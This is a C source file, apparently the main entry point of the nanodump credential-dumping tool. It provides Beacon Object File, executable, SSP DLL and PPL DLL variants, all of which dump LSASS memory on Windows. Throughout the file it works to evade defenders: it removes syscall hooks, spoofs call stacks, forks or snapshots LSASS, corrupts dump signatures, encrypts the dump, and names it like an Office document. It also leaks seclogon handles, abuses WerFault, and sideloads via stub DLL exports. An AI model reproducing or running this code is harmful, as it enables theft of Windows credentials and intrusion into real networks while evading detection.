#include "entry.h"

#ifdef BOF
 #include "nanodump.c"
#else
 #include "nanodump.h"
#endif

#if defined(NANO) && defined(BOF)

void go(char* args, int length)
{
    dump_context   dc;
    datap          parser;
    DWORD          lsass_pid;
    LPCSTR         dump_path;
    BOOL           write_dump_to_disk;
    BOOL           fork_lsass;
    BOOL           snapshot_lsass;
    BOOL           duplicate_handle;
    BOOL           use_valid_sig;
    BOOL           success = FALSE;
    BOOL           ret_val = FALSE;
    BOOL           get_pid_and_leave;
    BOOL           use_seclogon_leak_local;
    BOOL           use_seclogon_leak_remote;
    HANDLE         hProcess = NULL;
    BOOL           forked_lsass = FALSE;
    LPCSTR         seclogon_leak_remote_binary = NULL;
    BOOL           use_seclogon_duplicate;
    BOOL           use_werfault;
    LPCSTR         werfault_lsass;
    DWORD          spoof_callstack;
    PPROCESS_LIST  created_processes = NULL;
    HANDLE         hSnapshot = NULL;
    WCHAR          wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;
    DWORD permissions = 0;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    dc.BaseAddress = NULL;
    dc.DumpMaxSize = 0;

    BeaconDataParse(&parser, args, length);
    lsass_pid = BeaconDataInt(&parser);
    dump_path = BeaconDataExtract(&parser, NULL);
    write_dump_to_disk = (BOOL)BeaconDataInt(&parser);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    fork_lsass = (BOOL)BeaconDataInt(&parser);
    snapshot_lsass = (BOOL)BeaconDataInt(&parser);
    duplicate_handle = (BOOL)BeaconDataInt(&parser);
    get_pid_and_leave = (BOOL)BeaconDataInt(&parser);
    use_seclogon_leak_local = (BOOL)BeaconDataInt(&parser);
    use_seclogon_leak_remote = (BOOL)BeaconDataInt(&parser);
    seclogon_leak_remote_binary = BeaconDataExtract(&parser, NULL);
    use_seclogon_duplicate = (BOOL)BeaconDataInt(&parser);
    spoof_callstack = BeaconDataInt(&parser);
    use_werfault = (BOOL)BeaconDataInt(&parser);
    werfault_lsass = BeaconDataExtract(&parser, NULL);

    remove_syscall_callback_hook();

    success = enable_debug_priv();
    if (!success)
        goto cleanup;

    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            goto cleanup;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    if (get_pid_and_leave)
    {
        PRINT(LSASS " PID: %ld", lsass_pid);
        return;
    }

    if (use_werfault)
    {
        if (!create_folder(werfault_lsass))
        {
            PRINT_ERR("The folder \"%s\" is not valid.", werfault_lsass);
            return;
        }
        // let the Windows Error Reporting process make the dump for us
        werfault_silent_process_exit(lsass_pid, werfault_lsass);
        return;
    }

    if (write_dump_to_disk)
    {
        get_full_path(&full_dump_path, dump_path);
        if (!create_file(&full_dump_path))
            goto cleanup;
    }

    if (use_seclogon_leak_local || use_seclogon_leak_remote)
    {
        success = malseclogon_handle_leak(
            seclogon_leak_remote_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            use_seclogon_leak_local,
            lsass_pid,
            &created_processes);
        // delete the uploaded nanodump binary
        if (use_seclogon_leak_local)
            delete_file(seclogon_leak_remote_binary);
        if (!success)
            goto cleanup;
        if (use_seclogon_leak_local)
            return;
    }

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    // --seclogon-leak-remote requires --duplicate internaly
    if (use_seclogon_leak_remote)
        duplicate_handle = TRUE;

    permissions = LSASS_DEFAULT_PERMISSIONS;
    // if we used malseclogon_leak remotely, the handle won't have PROCESS_CREATE_PROCESS;
    if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak_remote)
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }

    hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        use_seclogon_duplicate,
        spoof_callstack,
        FALSE,
        dump_path);
    if (!hProcess)
        goto cleanup;

    success = check_handle_privs(hProcess, permissions);
    if (!success)
    {
        PRINT_ERR("Could not open a handle with the requested permissions");
        goto cleanup;
    }

    // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
    if ((fork_lsass || snapshot_lsass) &&
        (use_seclogon_leak_local || use_seclogon_leak_remote))
    {
        hProcess = make_handle_full_access(
            hProcess);
        if (!hProcess)
            goto cleanup;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess);
        if (!hProcess)
            goto cleanup;
        forked_lsass = TRUE;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            &hSnapshot);
        if (!hProcess)
            goto cleanup;
    }

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
        goto cleanup;

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);
    if (!success)
        goto cleanup;

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    if (!use_valid_sig)
    {
        // at this point, you can encrypt or obfuscate the dump
        encrypt_dump(
            dc.BaseAddress,
            dc.rva);
    }

    if (write_dump_to_disk)
    {
        success = write_file(
            &full_dump_path,
            dc.BaseAddress,
            dc.rva);
    }
    else
    {
        success = download_file(
            dump_path,
            dc.BaseAddress,
            dc.rva);
    }

    if (!success)
        goto cleanup;

    print_success(
        dump_path,
        use_valid_sig,
        write_dump_to_disk);

    ret_val = TRUE;

cleanup:
    if (forked_lsass || use_seclogon_duplicate)
        kill_process(0, hProcess);
    if (hProcess)
        NtClose(hProcess);
    if (dc.BaseAddress && dc.DumpMaxSize)
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
    if (!ret_val && write_dump_to_disk)
        delete_file(dump_path);
    if (hSnapshot)
        free_snapshot(hSnapshot);
    if (created_processes)
    {
        kill_created_processes(created_processes);
        intFree(created_processes); created_processes = NULL;
    }
}

#elif defined(NANO) && defined(EXE)

void usage(char* procname)
{
    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--werfault C:\\Windows\\Temp] [--fork] [--snapshot] [--getpid] [--help]", procname);
    PRINT("Dumpfile options:");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("Obtain an LSASS handle via:");
    PRINT("    --duplicate, -d");
    PRINT("            duplicate an existing " LSASS " handle");
    PRINT("    --seclogon-leak-local, -sll");
    PRINT("            leak an " LSASS " handle into nanodump via seclogon");
    PRINT("    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH");
    PRINT("            leak an " LSASS " handle into another process via seclogon and duplicate it");
    PRINT("    --seclogon-duplicate, -sd");
    PRINT("            make seclogon open a handle to " LSASS " and duplicate it");
#ifdef _WIN64
    PRINT("    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}");
    PRINT("            open a handle to " LSASS " using a fake calling stack");
#endif
    PRINT("Let WerFault.exe (instead of nanodump) create the dump");
    PRINT("    --werfault DUMP_FOLDER, -wf DUMP_FOLDER");
    PRINT("            force WerFault.exe to dump " LSASS);
    PRINT("Avoid reading " LSASS " directly:");
    PRINT("    --fork, -f");
    PRINT("            fork the target process before dumping");
    PRINT("    --snapshot, -s");
    PRINT("            snapshot the target process before dumping");
    PRINT("Miscellaneous:");
    PRINT("    --getpid");
    PRINT("            print the PID of " LSASS " and leave");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    dump_context   dc                             = { 0 };
    DWORD          lsass_pid                      = 0;
    HANDLE         hProcess                       = NULL;
    BOOL           fork_lsass                     = FALSE;
    BOOL           forked_lsass                   = FALSE;
    BOOL           snapshot_lsass                 = FALSE;
    BOOL           duplicate_handle               = FALSE;
    LPCSTR         werfault_lsass                 = NULL;
    LPCSTR         dump_path                      = NULL;
    BOOL           success                        = FALSE;
    BOOL           use_valid_sig                  = FALSE;
    BOOL           get_pid_and_leave              = FALSE;
    BOOL           use_seclogon_leak_local        = FALSE;
    BOOL           use_seclogon_leak_remote       = FALSE;
    BOOL           is_seclogon_leak_local_stage_2 = FALSE;
    LPCSTR         seclogon_leak_remote_binary    = NULL;
    BOOL           use_seclogon_duplicate         = FALSE;
    DWORD          spoof_callstack                = 0;
    HANDLE         hSnapshot                      = NULL;
    PPROCESS_LIST  created_processes              = NULL;
    DWORD          permissions                    = 0;
    BOOL           ret_val                        = FALSE;
    DWORD          num_modes                      = 0;
    WCHAR          wcFilePath[MAX_PATH]           = { 0 };
    UNICODE_STRING full_dump_path                 = { 0 };

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    dc.BaseAddress = NULL;
    dc.DumpMaxSize = 0;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return 0;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "--getpid", 9))
        {
            get_pid_and_leave = TRUE;
        }
        else if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return 0;
            }
            dump_path = argv[++i];
            get_full_path(&full_dump_path, dump_path);
        }
        else if (!strncmp(argv[i], "-p", 3) ||
                 !strncmp(argv[i], "--pid", 6))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --pid value");
                return 0;
            }
            i++;
            lsass_pid = atoi(argv[i]);
            if (!lsass_pid ||
                strspn(argv[i], "0123456789") != strlen(argv[i]))
            {
                PRINT("Invalid PID: %s", argv[i]);
                return 0;
            }
        }
        else if (!strncmp(argv[i], "-f", 3) ||
                 !strncmp(argv[i], "--fork", 7))
        {
            fork_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-s", 3) ||
                 !strncmp(argv[i], "--snapshot", 11))
        {
            snapshot_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--duplicate", 12))
        {
            duplicate_handle = TRUE;
        }
        else if (!strncmp(argv[i], "-sll", 5) ||
                 !strncmp(argv[i], "--seclogon-leak-local", 22))
        {
            use_seclogon_leak_local = TRUE;
        }
        else if (!strncmp(argv[i], "-slr", 5) ||
                 !strncmp(argv[i], "--seclogon-leak-remote", 23))
        {
            use_seclogon_leak_remote = TRUE;
            if (i + 1 >= argc)
            {
                PRINT("missing --seclogon-leak-remote value");
                return 0;
            }
            seclogon_leak_remote_binary = argv[++i];
            if (!strrchr(seclogon_leak_remote_binary, '\\'))
            {
                PRINT("You must provide a full path: %s", seclogon_leak_remote_binary);
                return 0;
            }
            if (!file_exists(seclogon_leak_remote_binary))
            {
                PRINT("The binary \"%s\" does not exists.", seclogon_leak_remote_binary);
                return 0;
            }
        }
        else if (!strncmp(argv[i], "-s2", 4) ||
                 !strncmp(argv[i], "--stage2", 9))
        {
            is_seclogon_leak_local_stage_2 = TRUE;
        }
        else if (!strncmp(argv[i], "-wf", 4) ||
                 !strncmp(argv[i], "--werfault", 11))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --werfault value");
                return 0;
            }
            werfault_lsass = argv[++i];
            if (!create_folder(werfault_lsass))
            {
                PRINT("The folder \"%s\" is not valid.", werfault_lsass);
                return 0;
            }
        }
        else if (!strncmp(argv[i], "-sd", 4) ||
                 !strncmp(argv[i], "--seclogon-duplicate", 21))
        {
            use_seclogon_duplicate = TRUE;
        }
#ifdef _WIN64
        else if (!strncmp(argv[i], "-sc", 4) ||
                 !strncmp(argv[i], "--spoof-callstack", 18))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --spoof-callstack value");
                return 0;
            }
            i++;
            if (!strncmp(argv[i], "svchost", 8))
            {
                spoof_callstack = SVC_STACK;
            }
            else if (!strncmp(argv[i], "wmi", 4))
            {
                spoof_callstack = WMI_STACK;
            }
            else if (!strncmp(argv[i], "rpc", 4))
            {
                spoof_callstack = RPC_STACK;
            }
            else
            {
                PRINT("invalid --spoof-callstack value");
                return 0;
            }
        }
#endif
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (full_dump_path.Length)
        num_modes++;
    if (get_pid_and_leave)
        num_modes++;
    if (werfault_lsass)
        num_modes++;
    if (num_modes != 1)
    {
        PRINT("Only one of the following parameters must be provided:")
        PRINT(" --write: nanodump will create the dump");
        PRINT(" --werfault: WerFault will create the dump");
        PRINT(" --getpid: get the PID of " LSASS);
        PRINT("Enter --help for more details");
        return 0;
    }

    if (get_pid_and_leave &&
        (use_valid_sig || snapshot_lsass || fork_lsass ||
         use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
         use_seclogon_leak_remote || duplicate_handle || werfault_lsass))
    {
        PRINT("The parameter --getpid is used alone");
        return 0;
    }

    if (werfault_lsass &&
        (use_valid_sig || snapshot_lsass || fork_lsass ||
         use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
         use_seclogon_leak_remote || duplicate_handle))
    {
        PRINT("The parameter --werfault is used alone");
        return 0;
    }

    if (fork_lsass && snapshot_lsass)
    {
        PRINT("The options --fork and --snapshot cannot be used together");
        return 0;
    }

    if (fork_lsass && use_seclogon_duplicate)
    {
        PRINT("The options --fork and --seclogon-duplicate cannot be used together");
        return 0;
    }

    if (duplicate_handle && spoof_callstack)
    {
        return 0;
        PRINT("The options --duplicate and --spoof-callstack cannot be used together");
    }

    if (duplicate_handle && use_seclogon_duplicate)
    {
        PRINT("The options --duplicate and --seclogon-duplicate cannot be used together");
        return 0;
    }

    if (duplicate_handle && use_seclogon_leak_local)
    {
        PRINT("The options --duplicate and --seclogon-leak-local cannot be used together");
        return 0;
    }

    if (duplicate_handle && use_seclogon_leak_remote)
    {
        PRINT("The options --duplicate and --seclogon-leak-remote cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_local && use_seclogon_leak_remote)
    {
        PRINT("The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_local && use_seclogon_duplicate)
    {
        PRINT("The options --seclogon-leak-local and --seclogon-duplicate cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_local && spoof_callstack)
    {
        PRINT("The options --seclogon-leak-local and --spoof-callstack cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_remote && use_seclogon_duplicate)
    {
        PRINT("The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_remote && spoof_callstack)
    {
        PRINT("The options --seclogon-leak-remote and --spoof-callstack cannot be used together");
        return 0;
    }

    if (use_seclogon_duplicate && snapshot_lsass)
    {
        PRINT("The options --seclogon-duplicate and --snapshot cannot be used together");
        return 0;
    }

    if (use_seclogon_duplicate && spoof_callstack)
    {
        PRINT("The options --seclogon-duplicate and --spoof-callstack cannot be used together");
        return 0;
    }

    if (use_seclogon_leak_local && !is_full_path(dump_path))
    {
        PRINT("If --malseclogon-leak-local is being used, you need to provide the full path: %s", dump_path);
        return 0;
    }

    remove_syscall_callback_hook();

    success = enable_debug_priv();
    if (!success)
        goto cleanup;

    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            goto cleanup;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    // get the PID of LSASS and leave (is this even used by anyone?)
    if (get_pid_and_leave)
    {
        PRINT(LSASS " PID: %ld", lsass_pid);
        return 0;
    }

    if (werfault_lsass)
    {
        // let the Windows Error Reporting process make the dump for us
        werfault_silent_process_exit(lsass_pid, werfault_lsass);
        return 0;
    }

    if (use_seclogon_leak_local && !seclogon_leak_remote_binary)
        seclogon_leak_remote_binary = argv[0];

    if (!is_seclogon_leak_local_stage_2)
    {
        if (!create_file(&full_dump_path))
            goto cleanup;
    }

    if ((use_seclogon_leak_remote || use_seclogon_leak_local) && !is_seclogon_leak_local_stage_2)
    {
        success = malseclogon_handle_leak(
            seclogon_leak_remote_binary,
            dump_path,
            fork_lsass,
            snapshot_lsass,
            use_valid_sig,
            use_seclogon_leak_local,
            lsass_pid,
            &created_processes);
        if (!success)
            goto cleanup;
        if (use_seclogon_leak_local)
            return 0;
    }

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    // --seclogon-leak-remote requires --duplicate internaly
    if (use_seclogon_leak_remote)
        duplicate_handle = TRUE;

    permissions = LSASS_DEFAULT_PERMISSIONS;
    if ((fork_lsass || snapshot_lsass) &&
        (!use_seclogon_leak_local && !use_seclogon_leak_remote))
    {
        permissions = LSASS_CLONE_PERMISSIONS;
    }

    hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        use_seclogon_duplicate,
        spoof_callstack,
        is_seclogon_leak_local_stage_2,
        dump_path);
    if (!hProcess)
        goto cleanup;

    success = check_handle_privs(hProcess, permissions);
    if (!success)
    {
        PRINT_ERR("Could not open a handle with the requested permissions");
        goto cleanup;
    }

    // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
    if ((fork_lsass || snapshot_lsass) &&
        (use_seclogon_leak_local || use_seclogon_leak_remote))
    {
        hProcess = make_handle_full_access(
            hProcess);
        if (!hProcess)
            goto cleanup;
    }

    // avoid reading LSASS directly by making a fork
    if (fork_lsass)
    {
        hProcess = fork_process(
            hProcess);
        if (!hProcess)
            goto cleanup;
        forked_lsass = TRUE;
    }

    // avoid reading LSASS directly by making a snapshot
    if (snapshot_lsass)
    {
        hProcess = snapshot_process(
            hProcess,
            &hSnapshot);
        if (!hProcess)
            goto cleanup;
    }

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
        goto cleanup;

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);
    if (!success)
        goto cleanup;

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    if (!use_valid_sig)
    {
        // at this point, you can encrypt or obfuscate the dump
        encrypt_dump(
            dc.BaseAddress,
            dc.rva);
    }

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    if (!success)
        goto cleanup;

    if (!is_seclogon_leak_local_stage_2)
    {
        print_success(
            dump_path,
            use_valid_sig,
            TRUE);
    }

    ret_val = TRUE;

cleanup:
    if (forked_lsass || use_seclogon_duplicate)
        kill_process(0, hProcess);
    if (hProcess)
        NtClose(hProcess);
    if (dc.BaseAddress && dc.DumpMaxSize)
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
    if (!ret_val)
        delete_file(dump_path);
    if (hSnapshot)
        free_snapshot(hSnapshot);
    if (created_processes)
    {
        kill_created_processes(created_processes);
        intFree(created_processes); created_processes = NULL;
    }

    return 0;
}

#elif defined(NANO) && defined(SSP)

#include "ssp.h"

BOOL NanoDumpSSP(void)
{
    /******************* change this *******************/
    LPCSTR dump_path     = "C:\\Windows\\Temp\\report.docx";
    BOOL   use_valid_sig = FALSE;
    /***************************************************/

    dump_context   dc;
    BOOL           success;
    WCHAR          wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;
    BOOL           bReturnValue = FALSE;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    dc.BaseAddress = NULL;
    dc.DumpMaxSize = 0;

    get_full_path(&full_dump_path, dump_path);

    if (!create_file(&full_dump_path))
        goto cleanup;

    // set the signature
    if (use_valid_sig)
    {
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    // we are LSASS after all :)
    HANDLE hProcess = NtCurrentProcess();

    // allocate a chuck of memory to write the dump
    SIZE_T region_size = DUMP_MAX_SIZE;
    PVOID base_address = allocate_memory(&region_size);
    if (!base_address)
        goto cleanup;

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);
    if (!success)
        goto cleanup;

    if (!use_valid_sig)
    {
        // at this point, you can encrypt or obfuscate the dump
        encrypt_dump(
            dc.BaseAddress,
            dc.rva);
    }

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    if (!success)
        goto cleanup;

    bReturnValue = TRUE;

cleanup:
    if (dc.BaseAddress && dc.DumpMaxSize)
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
    if (!bReturnValue)
        delete_file(dump_path);

    return bReturnValue;
}

__declspec(dllexport) BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            NanoDumpSSP();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return FALSE;
}

#elif defined(NANO) && defined(PPL)

#include "ppl/cleanup.h"

BOOL NanoDumpPPL(VOID)
{
    dump_context   dc                   = { 0 };
    BOOL           bReturnValue         = FALSE;
    HANDLE         hProcess             = NULL;
    DWORD          lsass_pid            = 0;
    BOOL           duplicate_handle     = FALSE;
    BOOL           success              = TRUE;
    BOOL           use_valid_sig        = FALSE;
    SIZE_T         region_size          = 0;
    PVOID          base_address         = NULL;
    DWORD          permissions          = 0;
    CHAR           dump_path[MAX_PATH]  = { 0 };
    WCHAR          wcFilePath[MAX_PATH] = { 0 };
    UNICODE_STRING full_dump_path       = { 0 };

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    dc.BaseAddress = NULL;
    dc.DumpMaxSize = 0;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return FALSE;
    }
#endif

    //remove_syscall_callback_hook();

    success = delete_known_dll_entry();
    if (!success)
        goto cleanup;

    CommandLineToArgvW_t CommandLineToArgvW;
    CommandLineToArgvW = (CommandLineToArgvW_t)(ULONG_PTR)get_function_address(
        get_library_address(SHELL32_DLL, TRUE),
        CommandLineToArgvW_SW2_HASH,
        0);
    if (!CommandLineToArgvW)
    {
        api_not_found("CommandLineToArgvW");
        goto cleanup;
    }
    GetCommandLineW_t GetCommandLineW;
    GetCommandLineW = (GetCommandLineW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetCommandLineW_SW2_HASH,
        0);
    if (!GetCommandLineW)
    {
        api_not_found("GetCommandLineW");
        goto cleanup;
    }

    LPWSTR* argv = NULL;
    int argc = 0;
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv || !argc)
        goto cleanup;

    for (int i = 1; i < argc; ++i)
    {
        if (!_wcsicmp(argv[i], L"-v") ||
            !_wcsicmp(argv[i], L"--valid"))
        {
            use_valid_sig = TRUE;
        }
        else if (!_wcsicmp(argv[i], L"-w") ||
                 !_wcsicmp(argv[i], L"--write"))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                goto cleanup;
            }
            wcstombs(dump_path, argv[++i], MAX_PATH);
            get_full_path(&full_dump_path, dump_path);
        }
        else if (!_wcsicmp(argv[i], L"-p") ||
                 !_wcsicmp(argv[i], L"--pid"))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --pid value");
                goto cleanup;
            }
            i++;
            lsass_pid = wcstoul(argv[i], NULL, 10);
        }
        else if (!_wcsicmp(argv[i], L"-d") ||
                 !_wcsicmp(argv[i], L"--duplicate"))
        {
            duplicate_handle = TRUE;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            goto cleanup;
        }
    }

    LocalFree(argv); argv = NULL;

    if (!full_dump_path.Length)
        goto cleanup;

    success = enable_debug_priv();
    if (!success)
        goto cleanup;
	
    // if not provided, get the PID of LSASS
    if (!lsass_pid)
    {
        lsass_pid = get_lsass_pid();
        if (!lsass_pid)
            goto cleanup;
    }
    else
    {
        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
    }

    if (!full_dump_path.Length)
    {
        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
        goto cleanup;
    }

    if (!create_file(&full_dump_path))
        goto cleanup;

    // set the signature
    if (use_valid_sig)
    {
        DPRINT("Using a valid signature");
        dc.Signature = MINIDUMP_SIGNATURE;
        dc.Version = MINIDUMP_VERSION;
        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
    }
    else
    {
        DPRINT("Using a invalid signature");
        generate_invalid_sig(
            &dc.Signature,
            &dc.Version,
            &dc.ImplementationVersion);
    }

    permissions = LSASS_DEFAULT_PERMISSIONS;

    hProcess = obtain_lsass_handle(
        lsass_pid,
        permissions,
        duplicate_handle,
        FALSE,
        FALSE,
        FALSE,
        dump_path);
    if (!hProcess)
        goto cleanup;

    success = check_handle_privs(hProcess, permissions);
    if (!success)
    {
        PRINT_ERR("Could not open a handle with the requested permissions");
        goto cleanup;
    }

    // allocate a chuck of memory to write the dump
    region_size = DUMP_MAX_SIZE;
    base_address = allocate_memory(&region_size);
    if (!base_address)
        goto cleanup;

    dc.hProcess    = hProcess;
    dc.BaseAddress = base_address;
    dc.rva         = 0;
    dc.DumpMaxSize = region_size;

    success = NanoDumpWriteDump(&dc);
    if (!success)
        goto cleanup;

    DPRINT(
        "The dump was created successfully, final size: %d MiB",
        (dc.rva/1024)/1024);

    if (!use_valid_sig)
    {
        // at this point, you can encrypt or obfuscate the dump
        encrypt_dump(
            dc.BaseAddress,
            dc.rva);
    }

    success = write_file(
        &full_dump_path,
        dc.BaseAddress,
        dc.rva);

    if (!success)
        goto cleanup;

    bReturnValue = TRUE;

cleanup:
    if (argv)
        LocalFree(argv);
    if (dc.BaseAddress && dc.DumpMaxSize)
        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
    if (hProcess)
        NtClose(hProcess);
    if (!bReturnValue)
        delete_file(dump_path);

    return bReturnValue;
}

__declspec(dllexport) BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            NanoDumpPPL();
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Windows 8.1 -> SspiCli.dll
//
//   000000014005B1C8  LogonUserExExW SspiCli
//
void APIENTRY LogonUserExExW() {}

//
// Windows 10 -> EventAggregation.dll
//
//   0000000140083728  EaDeleteAggregatedEvent EventAggregation
//   0000000140083730  BriCreateBrokeredEvent EventAggregation
//   0000000140083738  EaCreateAggregatedEvent EventAggregation
//   0000000140083740  BriDeleteBrokeredEvent EventAggregation
//   0000000140083748  EACreateAggregateEvent EventAggregation
//   0000000140083750  EaQueryAggregatedEventParameters EventAggregation
//   0000000140083758  EaFreeAggregatedEventParameters EventAggregation
//   0000000140083760  EADeleteAggregateEvent EventAggregation
//   0000000140083768  EAQueryAggregateEventData EventAggregation
void APIENTRY BriCreateBrokeredEvent() {}
void APIENTRY BriDeleteBrokeredEvent() {}
void APIENTRY EaCreateAggregatedEvent() {}
void APIENTRY EACreateAggregateEvent() {}
void APIENTRY EaQueryAggregatedEventParameters() {}
void APIENTRY EAQueryAggregateEventData() {}
void APIENTRY EaFreeAggregatedEventParameters() {}
void APIENTRY EaDeleteAggregatedEvent() {}
void APIENTRY EADeleteAggregateEvent() {}

#endif
